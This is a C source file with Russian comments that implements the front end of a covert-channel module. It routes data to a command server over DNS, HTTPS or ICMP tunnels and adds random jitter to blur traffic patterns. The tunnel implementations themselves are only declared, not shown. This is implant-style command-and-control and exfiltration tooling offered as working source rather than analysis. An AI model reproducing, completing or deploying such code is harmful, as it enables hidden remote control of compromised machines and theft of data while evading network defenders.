/**
 * @file covert_channel.c
 * @brief Реализация основного интерфейса для модуля скрытых каналов связи
 *
 * @author iamtomasanderson@gmail.com
 * @date 2023-09-03
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef _WIN32
#include <windows.h>
#define sleep_ms(ms) Sleep(ms)
#else
#include <unistd.h>
#define sleep_ms(ms) usleep(ms * 1000)
#endif

#include "network/covert_channel.h"

/**
 * @brief Структура данных для хранения состояния скрытого канала связи
 */
typedef struct {
    ChannelType channel_type;          ///< Тип канала связи
    EncryptionType encryption_type;    ///< Тип шифрования
    CovertChannelConfig config;        ///< Копия конфигурации
    void *channel_handle;              ///< Дескриптор конкретного канала (DNS, HTTPS, ICMP)
    unsigned char session_id[16];      ///< Уникальный идентификатор сессии
} CovertChannelData;

// Прототипы внешних функций модулей каналов связи
extern int dns_channel_init(const CovertChannelConfig *config, void **handle);
extern int dns_channel_connect(void *handle);
extern int dns_channel_send(void *handle, const unsigned char *data, size_t data_len);
extern int dns_channel_receive(void *handle, unsigned char *buffer, size_t buffer_size);
extern void dns_channel_cleanup(void *handle);

extern int https_channel_init(const CovertChannelConfig *config, void **handle);
extern int https_channel_connect(void *handle);
extern int https_channel_send(void *handle, const unsigned char *data, size_t data_len);
extern int https_channel_receive(void *handle, unsigned char *buffer, size_t buffer_size);
extern void https_channel_cleanup(void *handle);

extern int icmp_channel_init(const CovertChannelConfig *config, void **handle);
extern int icmp_channel_connect(void *handle);
extern int icmp_channel_send(void *handle, const unsigned char *data, size_t data_len);
extern int icmp_channel_receive(void *handle, unsigned char *buffer, size_t buffer_size);
extern void icmp_channel_cleanup(void *handle);

/**
 * @brief Генерирует случайный идентификатор сессии
 * 
 * @param session_id Буфер для хранения идентификатора (16 байт)
 */
static void generate_session_id(unsigned char *session_id) {
    if (session_id == NULL) {
        return;
    }
    
    srand((unsigned int)time(NULL));
    for (int i = 0; i < 16; i++) {
        session_id[i] = (unsigned char)(rand() % 256);
    }
}

/**
 * @brief Инициализирует модуль скрытых каналов связи
 * 
 * @param config Указатель на структуру с конфигурацией
 * @return CovertChannelHandle Дескриптор канала или NULL при ошибке
 */
CovertChannelHandle covert_channel_init(const CovertChannelConfig *config) {
    if (config == NULL) {
        return NULL;
    }
    
    // Выделение памяти для структуры данных канала
    CovertChannelData *channel_data = (CovertChannelData *)malloc(sizeof(CovertChannelData));
    if (channel_data == NULL) {
        return NULL;
    }
    
    // Инициализация структуры
    memset(channel_data, 0, sizeof(CovertChannelData));
    channel_data->channel_type = config->channel_type;
    channel_data->encryption_type = config->encryption_type;
    memcpy(&channel_data->config, config, sizeof(CovertChannelConfig));
    
    // Генерация уникального идентификатора сессии
    generate_session_id(channel_data->session_id);
    
    // Инициализация соответствующего канала связи
    int result = -1;
    
    switch (config->channel_type) {
        case CHANNEL_TYPE_DNS:
            result = dns_channel_init(config, &channel_data->channel_handle);
            break;
            
        case CHANNEL_TYPE_HTTPS:
            result = https_channel_init(config, &channel_data->channel_handle);
            break;
            
        case CHANNEL_TYPE_ICMP:
            result = icmp_channel_init(config, &channel_data->channel_handle);
            break;
            
        default:
            // Неизвестный тип канала
            free(channel_data);
            return NULL;
    }
    
    if (result != 0 || channel_data->channel_handle == NULL) {
        free(channel_data);
        return NULL;
    }
    
    return (CovertChannelHandle)channel_data;
}

/**
 * @brief Устанавливает соединение с сервером C1
 * 
 * @param handle Дескриптор канала
 * @return int 0 при успехе, код ошибки при неудаче
 */
int covert_channel_connect(CovertChannelHandle handle) {
    if (handle == NULL) {
        return -1;
    }
    
    CovertChannelData *channel_data = (CovertChannelData *)handle;
    
    // Вызов соответствующей функции установления соединения
    switch (channel_data->channel_type) {
        case CHANNEL_TYPE_DNS:
            return dns_channel_connect(channel_data->channel_handle);
            
        case CHANNEL_TYPE_HTTPS:
            return https_channel_connect(channel_data->channel_handle);
            
        case CHANNEL_TYPE_ICMP:
            return icmp_channel_connect(channel_data->channel_handle);
            
        default:
            return -1;
    }
}

/**
 * @brief Отправляет данные по скрытому каналу связи
 * 
 * @param handle Дескриптор канала
 * @param data Указатель на данные для отправки
 * @param data_len Размер данных в байтах
 * @return int Количество отправленных байт или -1 при ошибке
 */
int covert_channel_send(CovertChannelHandle handle, const char *data, size_t data_len) {
    if (handle == NULL || data == NULL || data_len == 0) {
        return -1;
    }
    
    CovertChannelData *channel_data = (CovertChannelData *)handle;
    
    // Добавление случайной задержки (jitter) перед отправкой
    if (channel_data->config.jitter_percent > 0) {
        int jitter_ms = rand() % 1000;
        sleep_ms(jitter_ms);
    }
    
    // Вызов соответствующей функции отправки данных
    switch (channel_data->channel_type) {
        case CHANNEL_TYPE_DNS:
            return dns_channel_send(channel_data->channel_handle, 
                                   (const unsigned char *)data, data_len);
            
        case CHANNEL_TYPE_HTTPS:
            return https_channel_send(channel_data->channel_handle, 
                                     (const unsigned char *)data, data_len);
            
        case CHANNEL_TYPE_ICMP:
            return icmp_channel_send(channel_data->channel_handle, 
                                    (const unsigned char *)data, data_len);
            
        default:
            return -1;
    }
}

/**
 * @brief Получает данные по скрытому каналу связи
 * 
 * @param handle Дескриптор канала
 * @param buffer Буфер для получаемых данных
 * @param buffer_size Размер буфера
 * @return int Количество полученных байт или -1 при ошибке
 */
int covert_channel_receive(CovertChannelHandle handle, char *buffer, size_t buffer_size) {
    if (handle == NULL || buffer == NULL || buffer_size == 0) {
        return -1;
    }
    
    CovertChannelData *channel_data = (CovertChannelData *)handle;
    
    // Добавление случайной задержки (jitter) перед получением
    if (channel_data->config.jitter_percent > 0) {
        int jitter_ms = rand() % 1000;
        sleep_ms(jitter_ms);
    }
    
    // Вызов соответствующей функции получения данных
    switch (channel_data->channel_type) {
        case CHANNEL_TYPE_DNS:
            return dns_channel_receive(channel_data->channel_handle, 
                                      (unsigned char *)buffer, buffer_size);
            
        case CHANNEL_TYPE_HTTPS:
            return https_channel_receive(channel_data->channel_handle, 
                                        (unsigned char *)buffer, buffer_size);
            
        case CHANNEL_TYPE_ICMP:
            return icmp_channel_receive(channel_data->channel_handle, 
                                       (unsigned char *)buffer, buffer_size);
            
        default:
            return -1;
    }
}

/**
 * @brief Освобождает ресурсы, связанные с каналом связи
 * 
 * @param handle Дескриптор канала
 */
void covert_channel_cleanup(CovertChannelHandle handle) {
    if (handle == NULL) {
        return;
    }
    
    CovertChannelData *channel_data = (CovertChannelData *)handle;
    
    // Вызов соответствующей функции очистки ресурсов
    switch (channel_data->channel_type) {
        case CHANNEL_TYPE_DNS:
            dns_channel_cleanup(channel_data->channel_handle);
            break;
            
        case CHANNEL_TYPE_HTTPS:
            https_channel_cleanup(channel_data->channel_handle);
            break;
            
        case CHANNEL_TYPE_ICMP:
            icmp_channel_cleanup(channel_data->channel_handle);
            break;
            
        default:
            break;
    }
    
    // Освобождение памяти
    free(channel_data);
}

/**
 * @brief Устанавливает параметры случайной задержки (jitter)
 * 
 * @param handle Дескриптор канала
 * @param jitter_percent Процент случайного отклонения (0-50)
 * @return int 0 при успехе, код ошибки при неудаче
 */
int covert_channel_set_jitter(CovertChannelHandle handle, int jitter_percent) {
    if (handle == NULL || jitter_percent < 0 || jitter_percent > 50) {
        return -1;
    }
    
    CovertChannelData *channel_data = (CovertChannelData *)handle;
    channel_data->config.jitter_percent = jitter_percent;
    
    return 0;
} 